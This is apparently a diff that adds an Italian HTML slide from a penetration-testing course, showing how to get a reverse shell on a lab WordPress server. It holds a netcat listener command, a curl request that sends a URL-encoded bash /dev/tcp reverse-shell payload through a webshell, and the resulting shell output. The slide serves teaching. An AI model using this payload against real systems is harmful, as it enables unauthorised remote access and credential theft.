@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <title>Capitolo 4: Exploitation - Reverse Shell</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="nav-buttons">
+        <div class="nav-btn" id="nav-menu"><svg viewBox="0 0 24 24"><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></div>
+        <div class="nav-btn" id="nav-prev"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"></polyline></svg></div>
+        <div class="nav-btn" id="nav-next"><svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"></polyline></svg></div>
+    </div>
+
+    <div class="container">
+        <h1 class="title">Capitolo 4: Exploitation</h1>
+        <div class="subtitle">Slide 4.4: Ottenere una Reverse Shell</div>
+
+        <div class="grid-2-col">
+            <div class="card border-blue">
+                <div class="card-title">Teoria: Webshell vs Reverse Shell</div>
+                <div class="card-text">
+                    <p>La webshell è comoda ma limitata. Una <strong>reverse shell</strong> ci dà una sessione interattiva completa.</p>
+                    <br>
+                    <table style="width: 100%; border-collapse: collapse;">
+                        <tr style="border-bottom: 1px solid rgba(255,255,255,0.2);">
+                            <td style="padding: 8px;"><strong>Webshell</strong></td>
+                            <td style="padding: 8px;"><strong>Reverse Shell</strong></td>
+                        </tr>
+                        <tr style="border-bottom: 1px solid rgba(255,255,255,0.2);">
+                            <td style="padding: 8px;">Un comando alla volta</td>
+                            <td style="padding: 8px;">Sessione interattiva</td>
+                        </tr>
+                        <tr style="border-bottom: 1px solid rgba(255,255,255,0.2);">
+                            <td style="padding: 8px;">Output via HTTP</td>
+                            <td style="padding: 8px;">Output in tempo reale</td>
+                        </tr>
+                        <tr>
+                            <td style="padding: 8px;">Visibile nei log</td>
+                            <td style="padding: 8px;">Connessione "pulita"</td>
+                        </tr>
+                    </table>
+                    <br>
+                    <p><strong>Come funziona:</strong></p>
+                    <ol style="margin-left: 20px; margin-top: 10px;">
+                        <li>Attacker avvia listener (nc -lvnp 4444)</li>
+                        <li>Target si connette all'attacker</li>
+                        <li>La shell "viaggia" sulla connessione</li>
+                    </ol>
+                    <br>
+                    <p class="security-insight"><strong>Security Insight:</strong> La reverse shell bypassa i firewall perché è una connessione OUTBOUND dal target. I firewall bloccano l'ingresso, non l'uscita.</p>
+                </div>
+            </div>
+
+            <div class="card border-green">
+                <div class="card-title">Lab: Stabilire Reverse Shell</div>
+                <div class="card-text">
+                    <p><strong>Step 1: Avviare listener sull'attacker</strong></p>
+                    <div class="code-box"><span class="text-yellow">┌──(kali㉿kali)-[~]</span>
+<span class="text-red">└─$</span> nc -lvnp 4444
+listening on [any] 4444 ...</div>
+                    <br>
+                    <p><strong>Step 2: Triggerare la reverse shell</strong></p>
+                    <div class="code-box"><span class="text-green"># In un altro terminale:</span>
+<span class="text-red">└─$</span> curl "http://vulnerable-wp.local/.../shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.10.5/4444+0>%261'"</div>
+                    <br>
+                    <p><strong>Step 3: Riceviamo la connessione!</strong></p>
+                    <div class="code-box">connect to [10.10.10.5] from (UNKNOWN) [10.10.10.20] 52134
+<span class="text-green">www-data@vulnerable-wp:/var/www/html/wp-content/plugins$</span> whoami
+www-data
+<span class="text-green">www-data@vulnerable-wp:$</span> id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</div>
+                    <br>
+                    <p><span class="text-green">✓ Shell interattiva ottenuta!</span></p>
+                </div>
+            </div>
+        </div>
+        
+    </div>
+
+    <!-- 
+        SPEAKER NOTES:
+        "Ora upgradiamo a una shell vera. A sinistra, le differenze tra webshell e reverse shell.
+        La reverse shell è più potente: sessione interattiva, possiamo usare comandi complessi, vim, meno visibile nei log HTTP.
+        A destra, il processo. Prima avviamo netcat in ascolto sulla porta 4444.
+        Poi triggeriamo la reverse shell dal target. Il payload bash usa /dev/tcp per connettersi al nostro IP.
+        IMPORTANTE: notate l'encoding URL (+, %26). I caratteri speciali vanno encodati!
+        Il risultato: una shell interattiva come www-data. Possiamo navigare il filesystem, leggere file, cercare credenziali.
+        Questo è il punto di svolta di un pentest: da 'forse vulnerabile' a 'ho accesso al sistema'."
+    -->
+
+    <script>const slideNumero = 27;</script>
+    <script src="main.js"></script>
+</body>
+</html>
+
